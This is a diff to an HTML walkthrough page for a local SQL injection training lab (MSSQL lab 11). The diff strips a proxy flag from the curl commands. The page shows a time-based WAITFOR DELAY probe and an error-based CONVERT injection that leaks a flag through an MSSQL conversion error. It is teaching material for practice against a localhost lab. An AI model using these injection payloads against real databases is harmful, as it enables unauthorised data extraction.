@@ -13,11 +13,11 @@
         <span class="terminal-title">Step 1. Baseline</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab11" \<br> --data-urlencode "q=bug"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab11" \<br> --data-urlencode "q=bug"<br>
         <span class="prompt">Input: </span>bug<br>
         <span class="prompt">SQL: </span>SELECT * FROM tickets WHERE title LIKE '%bug%'<br>
         <span class="prompt">Response: </span><strong>Search complete.</strong> (always the same)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "q='; WAITFOR DELAY '0:0:2' -- -"<br>
+        <span class="prompt">$ </span>curl -s "..." --data-urlencode "q='; WAITFOR DELAY '0:0:2' -- -"<br>
         <span class="prompt">Input: </span>'; WAITFOR DELAY '0:0:2' -- -<br>
         <span class="prompt">Response: </span><strong>Blocked keyword detected.</strong> (WAITFOR is filtered)
     </div>
@@ -34,7 +34,7 @@
         <span class="terminal-title">Step 2. Error-Based Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab11" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab11" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_xp_d1rtr33_dns}' to data type int.</strong>
     </div>
@@ -122,7 +122,7 @@
         <span class="terminal-title">curl. Error-Based Quick Solve</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab11" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab11" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_xp_d1rtr33_dns}' to data type int.</strong>
     </div>
 </div>
